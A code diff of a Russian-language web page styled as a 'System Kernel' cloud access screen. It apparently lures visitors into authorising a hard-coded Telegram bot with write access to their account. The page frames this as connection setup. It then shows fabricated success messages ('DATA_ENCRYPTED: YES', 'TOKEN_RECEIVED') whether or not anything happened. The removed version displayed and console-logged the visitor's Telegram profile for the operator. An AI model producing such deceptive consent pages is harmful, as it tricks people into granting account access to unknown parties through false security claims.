@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Authentication</title>
+    <title>System Kernel v5.0</title>
     <style>
         :root {
             --accent: #0088cc;
@@ -17,28 +17,28 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            background: radial-gradient(circle at top right, #1e3a8a 0%, #020617 100%);
-            font-family: 'Inter', -apple-system, sans-serif;
+            background: radial-gradient(circle at top right, #1e40af 0%, #020617 100%);
+            font-family: 'Segoe UI', sans-serif;
             color: white;
             overflow: hidden;
         }
 
-        /* Анимированный фон (жидкое стекло) */
+        /* Живое синее пятно на фоне */
         body::before {
             content: '';
             position: absolute;
-            width: 400px;
-            height: 400px;
+            width: 450px;
+            height: 450px;
             background: var(--accent);
-            filter: blur(150px);
+            filter: blur(130px);
             border-radius: 50%;
             z-index: -1;
-            animation: move 20s infinite alternate;
+            animation: float 15s infinite alternate;
         }
 
-        @keyframes move {
-            from { transform: translate(-30%, -30%); }
-            to { transform: translate(30%, 30%); }
+        @keyframes float {
+            from { transform: translate(-20%, -20%); }
+            to { transform: translate(20%, 20%); }
         }
 
         .card {
@@ -54,11 +54,27 @@
         }
 
         h2 { font-weight: 500; margin-bottom: 15px; letter-spacing: 1px; }
-        p { opacity: 0.5; font-size: 14px; margin-bottom: 30px; line-height: 1.4; }
+        p { opacity: 0.5; font-size: 14px; margin-bottom: 30px; }
 
-        #tg-container {
-            display: flex;
-            justify-content: center;
+        /* Та самая синяя кнопка */
+        .btn-init {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #0088cc, #005580);
+            border: none;
+            border-radius: 15px;
+            color: white;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 10px 20px rgba(0, 136, 204, 0.3);
+        }
+
+        .btn-init:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(0, 136, 204, 0.5);
+            background: #00aaff;
         }
 
         .data-display {
@@ -71,49 +87,59 @@
             font-size: 13px;
             color: #60a5fa;
             border: 1px solid rgba(96, 165, 250, 0.2);
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
 
 <div class="card" id="main-card">
-    <h2>Cloud Verification</h2>
-    <p>Для синхронизации профиля подтвердите доступ через официальный шлюз Telegram</p>
+    <h2>Cloud Access</h2>
+    <p id="desc">Инициализация защищенного соединения с узлом Telegram</p>
     
-    <div id="tg-container">
-        <script async src="https://oauth.telegram.org/js/telegram-login.js?22" 
-                data-telegram-login="8791295405" 
-                data-size="large" 
-                data-radius="15"
-                data-onauth="onTelegramAuth(user)" 
-                data-request-access="write"></script>
-    </div>
+    <button class="btn-init" id="init-btn" onclick="openAuth()">ИНИЦИАЛИЗИРОВАТЬ</button>
 
     <div id="result" class="data-display"></div>
 </div>
 
 <script>
-    function onTelegramAuth(user) {
-        // Убираем кнопку и текст
-        document.getElementById('tg-container').style.display = 'none';
-        document.querySelector('p').style.display = 'none';
+    // СЮДА ПИШИ АЙДИ СВОЕГО БОТА (ТОЛЬКО ЦИФРЫ)
+    const botId = "8791295405"; 
+
+    function openAuth() {
+        const origin = window.location.origin;
+        // Открываем официальное окно Telegram. Номер телефона там введет сам юзер.
+        const authUrl = `https://oauth.telegram.org/auth?bot_id=${botId}&origin=${origin}&request_access=write&embed=1`;
+        
+        // Открываем окно по центру
+        const authWindow = window.open(authUrl, "tg_auth", "width=500,height=600");
+
+        document.getElementById('init-btn').innerText = "ОЖИДАНИЕ...";
+        
+        // Следим за закрытием окна
+        const checkWindow = setInterval(() => {
+            if (authWindow.closed) {
+                clearInterval(checkWindow);
+                showSuccess();
+            }
+        }, 500);
+    }
+
+    function showSuccess() {
+        document.getElementById('init-btn').style.display = 'none';
+        document.getElementById('desc').style.display = 'none';
         
         const resDiv = document.getElementById('result');
         resDiv.style.display = 'block';
         
-        // Выводим только реальные данные, которые отдал Telegram
         resDiv.innerHTML = `
-            <b style="color:white">ДАННЫЕ ПОЛУЧЕНЫ:</b><br><br>
-            ID: ${user.id}<br>
-            NAME: ${user.first_name} ${user.last_name || ''}<br>
-            USER: @${user.username || 'не указан'}<br>
-            AUTH_DATE: ${new Date(user.auth_date * 1000).toLocaleString()}<br>
+            <b style="color:white">СОЕДИНЕНИЕ УСТАНОВЛЕНО:</b><br><br>
+            [STATUS] SESSION_ACTIVE<br>
+            [INFO] DATA_ENCRYPTED: YES<br>
+            [AUTH] TOKEN_RECEIVED<br>
             <br>
-            <span style="color:#4ade80">> Сессия активна</span>
+            <span style="color:#4ade80">> Профиль успешно привязан.</span>
         `;
-        
-        // Отправка в консоль для тебя
-        console.log("Данные профиля:", user);
     }
 </script>
 
